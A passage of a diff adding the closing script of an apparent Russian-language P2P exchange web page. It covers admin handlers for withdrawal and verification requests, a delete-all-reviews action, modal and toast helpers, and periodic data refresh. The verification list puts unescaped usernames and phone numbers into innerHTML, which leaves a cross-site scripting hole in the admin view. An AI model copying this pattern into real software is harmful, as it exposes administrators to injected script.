+                adminWithdrawRequests();
+            }
+        }
+
+        async function adminRejectWithdraw(requestId) {
+            if (!confirm('Отклонить заявку?')) return;
+            const data = await apiCall('/api/reject_withdraw', { request_id: requestId });
+            if (data.success) {
+                showToast('✅ Заявка отклонена', 'success');
+                closeModal();
+                adminWithdrawRequests();
+            }
+        }
+
+        async function adminVerificationRequests() {
+            const data = await apiCall('/api/verification_requests');
+            if (data.success && data.requests) {
+                const pending = data.requests.filter(r => r.status === 'pending');
+                if (pending.length === 0) {
+                    showModal('<h3>🔐 Запросы верификации</h3><p class="text-secondary">Нет активных запросов</p>');
+                    return;
+                }
+                const html = pending.map(r => `
+                    <div class="deal-card">
+                        <strong>👤 ${r.username}</strong>
+                        <div>📱 ${r.phone}</div>
+                        <div style="font-size:12px;color:var(--text-secondary);">🆔 ${r.user_id}</div>
+                        <div class="flex mt-6">
+                            <button class="btn btn-success btn-sm" onclick="adminApproveVerification('${r.id}')">
+                                <i class="fas fa-check"></i> Одобрить
+                            </button>
+                            <button class="btn btn-danger btn-sm" onclick="adminRejectVerification('${r.id}')">
+                                <i class="fas fa-times"></i> Отклонить
+                            </button>
+                        </div>
+                    </div>
+                `).join('');
+                showModal('<h3>🔐 Запросы верификации</h3>' + html);
+            }
+        }
+
+        async function adminApproveVerification(requestId) {
+            if (!confirm('Одобрить верификацию?')) return;
+            const data = await apiCall('/api/approve_verification', { request_id: requestId });
+            if (data.success) {
+                showToast('✅ Верификация одобрена', 'success');
+                closeModal();
+                adminVerificationRequests();
+            }
+        }
+
+        async function adminRejectVerification(requestId) {
+            if (!confirm('Отклонить верификацию?')) return;
+            const data = await apiCall('/api/reject_verification', { request_id: requestId });
+            if (data.success) {
+                showToast('✅ Запрос отклонён', 'success');
+                closeModal();
+                adminVerificationRequests();
+            }
+        }
+
+        async function adminClearReviews() {
+            if (!confirm('Удалить ВСЕ отзывы?')) return;
+            const data = await apiCall('/api/clear_reviews');
+            if (data.success) {
+                showToast('✅ Все отзывы удалены', 'success');
+                loadReviews();
+                loadMainData();
+            }
+        }
+
+        // ============================================================
+        // 17. МОДАЛКА
+        // ============================================================
+        function showModal(html) {
+            document.getElementById('modalBody').innerHTML = html;
+            document.getElementById('modal').classList.add('active');
+        }
+
+        function closeModal() {
+            document.getElementById('modal').classList.remove('active');
+        }
+
+        document.getElementById('modal').addEventListener('click', (e) => {
+            if (e.target === document.getElementById('modal')) closeModal();
+        });
+
+        // ============================================================
+        // 18. TOAST
+        // ============================================================
+        function showToast(text, type = 'info') {
+            const existing = document.querySelector('.toast');
+            if (existing) existing.remove();
+            const toast = document.createElement('div');
+            toast.className = `toast ${type}`;
+            toast.textContent = text;
+            document.body.appendChild(toast);
+            setTimeout(() => toast.remove(), 3500);
+        }
+
+        // ============================================================
+        // 19. ЗАПУСК
+        // ============================================================
+        console.log('🔥 P2P Exchange загружена');
+
+        loadMainData();
+        loadBalance();
+        loadDeals();
+        loadReviews();
+
+        setInterval(() => {
+            document.getElementById('onlineCount').textContent = getOnlineCount();
+        }, 5000);
+
+        setInterval(() => {
+            if (document.getElementById('page-main').classList.contains('active')) loadMainData();
+            if (document.getElementById('page-balance').classList.contains('active')) loadBalance();
+            if (document.getElementById('page-deals').classList.contains('active')) loadDeals();
+            if (document.getElementById('page-reviews').classList.contains('active')) loadReviews();
+        }, 30000);
+    </script>
+</body>
+</html>
